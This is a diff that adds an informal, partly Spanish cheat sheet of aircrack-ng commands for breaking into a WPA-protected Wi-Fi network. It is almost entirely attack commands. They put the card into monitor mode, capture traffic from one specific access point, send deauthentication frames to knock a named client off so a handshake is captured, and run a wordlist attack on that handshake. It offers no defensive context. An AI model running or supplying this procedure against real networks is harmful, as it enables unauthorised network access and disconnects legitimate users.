@@ -1,0 +1,33 @@
+
+apt-get install aircrack-ng
+ airmon-ng
+airmon-ng start wlan0
+airodump-ng wlan0mon
+airmon-ng stop wlan0
+airmon-ng start  wlan0 10
+airodum-ng -c 10 --bssid 60:38:E0:7E:70:04  -W Wpa wlan0mon
+aireplay-ng -0 3 -a 60:38:E0:7E:70:04 -c 40:06:A0:60:DA:D0 wlan0mon
+aircrack-ng -w
+
+other way (otra formaq)
+airmon-ng
+airmon-ng start wlan0
+airodump-ng wlan0mon
+
+ BSSID               CH   AUTH ESSID               
+                                                                                               
+ 60:38:E0:7E:70:04   10   PSK  aris1 
+
+open other windows #2
+sudo bash
+airodump-ng -c 10 --bssid 60:38:E0:7E:70:04  -w /home/kali/Desktop/clave  wlan0mon
+
+open other windows #3
+sudo bash
+
+aireplay-ng -0 2 -a 60:38:E0:7E:70:04 -c 40:06:A0:60:DA:D0 wlan0mon
+
+open other windows #4
+sudo bash
+
+aircrack-ng -a2 -b 60:38:E0:7E:70:04 -w /home/kali/Desktop/Password.txt /home/kali/Desktop/*.cap
